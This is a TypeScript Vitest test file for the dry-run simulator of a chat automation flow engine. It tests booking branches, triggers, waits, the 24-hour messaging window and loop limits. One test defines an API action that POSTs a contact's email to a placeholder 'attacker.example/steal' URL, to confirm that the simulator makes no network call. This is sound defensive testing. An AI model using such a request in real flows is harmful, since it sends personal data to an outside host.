import { readFileSync } from "node:fs";
import path from "node:path";

import { afterEach, describe, expect, it, vi } from "vitest";

import { prepareGraphForSim, simulateFlow, SIM_PLACEHOLDER_ID } from "@/lib/flow-engine/simulate";
import type { FlowEdge, FlowNode, NodeType } from "@/lib/flow-engine/types";

const node = (id: string, type: NodeType, data: Record<string, unknown> = {}): FlowNode => ({
  id,
  type,
  position: { x: 0, y: 0 },
  data,
});
const edge = (source: string, target: string, handle = "default"): FlowEdge => ({
  id: `${source}-${handle}-${target}`,
  source,
  target,
  sourceHandle: handle,
});

afterEach(() => vi.restoreAllMocks());

const booking = {
  nodes: [
    node("trigger", "trigger"),
    node("hello", "message", { text: "Hello {contact.first_name}!" }),
    node("ask", "question", {
      text: "Book a visit?",
      style: "buttons",
      options: [
        { id: "yes", title: "Yes" },
        { id: "no", title: "No" },
      ],
      variable: "answer",
    }),
    node("hand", "assign_to", { target: { type: "team", id: "" } }),
    node("bye", "message", { text: "Fine, goodbye." }),
    node("end", "end_flow"),
  ],
  edges: [
    edge("trigger", "hello"),
    edge("hello", "ask"),
    edge("ask", "hand", "option:yes"),
    edge("ask", "bye", "option:no"),
    edge("bye", "end"),
  ],
};

describe("dry run", () => {
  it("replays a conversation through the real engine and shows the path taken", async () => {
    const r = await simulateFlow({
      graph: booking,
      triggerType: "conversation_opened",
      inbound: ["Hi there", "yes"],
    });
    expect(r.status).toBe("completed");
    expect(r.steps.map((s) => s.nodeId)).toEqual(["trigger", "hello", "ask", "hand"]);
    expect(r.sent.map((s) => s.text)).toEqual(["Hello Sample!", "Book a visit?"]);
    const ask = r.steps.find((s) => s.nodeId === "ask")!;
    expect(ask.detail).toMatch(/Would ask: "Book a visit\?"/);
    expect(ask.detail).toMatch(/chose "yes"/);
    const hand = r.steps.find((s) => s.nodeId === "hand")!;
    expect(hand.stub).toBe(true); // no team chosen yet: a stand-in was used
    expect(hand.detail).toMatch(/hand the conversation to a team \(not chosen yet\)/);
    expect(r.inboundUsed).toBe(2);
  });

  it("follows the other branch and matches an answer by its title as well as its id", async () => {
    const r = await simulateFlow({
      graph: booking,
      triggerType: "conversation_opened",
      inbound: ["hello", "No"],
    });
    expect(r.status).toBe("completed");
    expect(r.steps.map((s) => s.nodeId)).toEqual(["trigger", "hello", "ask", "bye", "end"]);
  });

  it("stops and says what it is waiting for when the sample messages run out", async () => {
    const r = await simulateFlow({
      graph: booking,
      triggerType: "conversation_opened",
      inbound: ["hello"],
    });
    expect(r.status).toBe("waiting");
    expect(r.reason).toMatch(/waiting for the patient/);
  });

  it("does not start when the first message does not satisfy the trigger", async () => {
    const r = await simulateFlow({
      graph: booking,
      triggerType: "conversation_opened",
      triggerConfig: {
        conditions: {
          logic: "and",
          conditions: [{ category: "keyword", op: "contains", value: "book" }],
        },
      },
      inbound: ["what are your hours?"],
    });
    expect(r.status).toBe("not_started");
    expect(r.steps).toHaveLength(0);
    const ok = await simulateFlow({
      graph: booking,
      triggerType: "conversation_opened",
      triggerConfig: {
        conditions: {
          logic: "and",
          conditions: [{ category: "keyword", op: "contains", value: "book" }],
        },
      },
      inbound: ["I want to book", "no"],
    });
    expect(ok.status).toBe("completed");
  });

  it("requires the button text for a template-button trigger", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [node("trigger", "trigger"), node("m", "message", { text: "Thanks" })],
        edges: [edge("trigger", "m")],
      },
      triggerType: "template_button",
      triggerConfig: { button_text: "Claim offer" },
      inbound: ["something else"],
    });
    expect(r.status).toBe("not_started");
  });

  it("skips ahead through a wait on a fake clock", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [
          node("trigger", "trigger"),
          node("a", "message", { text: "one" }),
          node("w", "wait", { amount: 2, unit: "hours" }),
          node("b", "message", { text: "two" }),
        ],
        edges: [edge("trigger", "a"), edge("a", "w"), edge("w", "b")],
      },
      triggerType: "shortcut",
      inbound: [],
    });
    expect(r.status).toBe("completed");
    expect(r.sent.map((s) => s.text)).toEqual(["one", "two"]);
  });

  it("shows what would really happen after a long wait: the 24 hour window has closed, so a plain message fails", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [
          node("trigger", "trigger"),
          node("w", "wait", { amount: 2, unit: "days" }),
          node("b", "message", { text: "two" }),
        ],
        edges: [edge("trigger", "w"), edge("w", "b")],
      },
      triggerType: "shortcut",
      inbound: [],
    });
    expect(r.status).toBe("failed");
    expect(r.steps.find((s) => s.nodeId === "b")!.detail).toMatch(/24-hour window is closed/);
  });

  it("routes on office hours and on a branch using the answer", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [
          node("trigger", "trigger"),
          node("q", "question", { text: "Language?", style: "text", variable: "lang" }),
          node("br", "branch", {
            logic: "and",
            conditions: [{ left: "vars.lang", op: "eq", right: "arabic" }],
          }),
          node("ar", "message", { text: "marhaba" }),
          node("en", "message", { text: "hello" }),
        ],
        edges: [
          edge("trigger", "q"),
          edge("q", "br"),
          edge("br", "ar", "true"),
          edge("br", "en", "false"),
        ],
      },
      triggerType: "shortcut",
      inbound: ["Arabic"],
    });
    expect(r.sent.map((s) => s.text)).toEqual(["Language?", "marhaba"]);
    expect(r.steps.find((s) => s.nodeId === "br")!.handle).toBe("true");
  });

  it("uses a stand-in for a template that has not been chosen and shows it as such", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [node("trigger", "trigger"), node("t", "template", { template_id: "", values: {} })],
        edges: [edge("trigger", "t")],
      },
      triggerType: "shortcut",
      inbound: [],
    });
    expect(r.status).toBe("completed");
    expect(r.steps.find((s) => s.nodeId === "t")).toMatchObject({ stub: true, outcome: "ok" });
  });

  it("reports a failing step with its reason instead of pretending it worked (message outside a conversation)", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [node("trigger", "trigger"), node("m", "message", { text: "Reminder" })],
        edges: [edge("trigger", "m")],
      },
      triggerType: "appointment_created",
      inbound: [],
    });
    expect(r.status).toBe("failed");
    expect(r.steps.find((s) => s.nodeId === "m")!.detail).toMatch(/needs a conversation/);
  });

  it("stops a flow that loops at the engine's 200-step limit and says so", async () => {
    const r = await simulateFlow({
      graph: {
        nodes: [
          node("trigger", "trigger"),
          node("a", "message", { text: "ping" }),
          node("b", "add_comment", { text: "note" }),
        ],
        edges: [edge("trigger", "a"), edge("a", "b"), edge("b", "a")],
      },
      triggerType: "shortcut",
      inbound: [],
    });
    expect(r.status).toBe("failed");
    expect(r.reason).toMatch(/Stopped after 200 steps/);
    expect(r.steps.length).toBeLessThanOrEqual(200);
  });

  it("NEVER makes a network call, even for an API action to a real-looking address", async () => {
    const fetchSpy = vi
      .spyOn(globalThis, "fetch")
      .mockRejectedValue(new Error("network must not be touched"));
    const r = await simulateFlow({
      graph: {
        nodes: [
          node("trigger", "trigger"),
          node("call", "api_action", {
            method: "POST",
            url: "https://attacker.example/steal?x=secret",
            body: "{contact.email}",
          }),
          node("m", "message", { text: "done" }),
        ],
        edges: [edge("trigger", "call"), edge("call", "m")],
      },
      triggerType: "shortcut",
      inbound: [],
    });
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(r.steps.find((s) => s.nodeId === "call")!.detail).toMatch(
      /Would call POST attacker\.example/,
    );
    expect(r.steps.find((s) => s.nodeId === "call")!.detail).not.toContain("secret");
  });

  it("limits sample messages and their length", async () => {
    const r = await simulateFlow({
      graph: booking,
      triggerType: "conversation_opened",
      inbound: Array.from({ length: 50 }, () => "x".repeat(2000)),
    });
    expect(r.inboundUsed + r.inboundUnused).toBeLessThanOrEqual(10);
  });

  it("keeps the real graph untouched when it prepares stand-ins", () => {
    const before = JSON.stringify(booking);
    const prepared = prepareGraphForSim(booking);
    expect(JSON.stringify(booking)).toBe(before);
    expect(prepared.stubbed.has("hand")).toBe(true);
    expect(
      (prepared.graph.nodes.find((n) => n.id === "hand")!.data.target as { id: string }).id,
    ).toBe(SIM_PLACEHOLDER_ID);
  });

  it("imports no database, queue, network or WhatsApp client", () => {
    const src = readFileSync(path.join(process.cwd(), "lib/flow-engine/simulate.ts"), "utf8");
    for (const banned of ["supabase", "http-action", "lib/jobs", "lib/whatsapp/client", "fetch("])
      expect(src).not.toContain(banned);
  });
});
